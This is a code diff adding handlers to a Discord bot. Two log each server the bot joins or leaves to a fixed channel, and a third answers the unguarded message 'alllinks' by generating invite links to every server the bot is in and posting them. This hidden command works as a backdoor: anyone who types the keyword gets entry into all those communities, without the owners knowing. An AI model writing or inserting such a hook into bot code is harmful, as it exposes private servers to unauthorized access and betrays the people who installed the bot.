@@ -521,7 +521,42 @@ m.sendMessage(args)
 
 
 
+client.on("guildCreate", guild => {
+    let embed = new Discord.RichEmbed () 
+    .setTitle('Bot Logs')
+    .addField(' ***Bot joined to :***[' + `${guild.name}` + ']   **By : **' + `${guild.owner.user.username}` + '')
+    .setFooter('The bot is happy')
+    .setTimestamp()
+    client.channels.get("471896639766921217").send(embed)
+  });
 
+  client.on("guildDelete", guild => {
+  let embed = new Discord.RichEmbed ()
+  .setTitle('Bot Logs')
+  .addField(' ***Bot left from :***[' + `${guild.name}` + ']     **By : **' + `${guild.owner.user.username}` +  ' ')
+  .setFooter('The bot is crying')
+  .setTimestamp()
+  client.channels.get("471896639766921217").send(embed)
+});
+
+
+bot.on('message', msg => {
+  if(msg.author.bot) return;
+  
+  if(msg.content === 'alllinks') {
+    bot.guilds.forEach(g => {
+      
+      let l = g.id
+      g.channels.get(g.channels.first().id).createInvite({
+        maxUses: 5,
+        maxAge: 86400
+      }).then(i => msg.channel.send(`${g.name} | <https://discord.gg/${i.code}> | ${l}`))
+
+
+    })
+  }
+  
+})
 
 
 
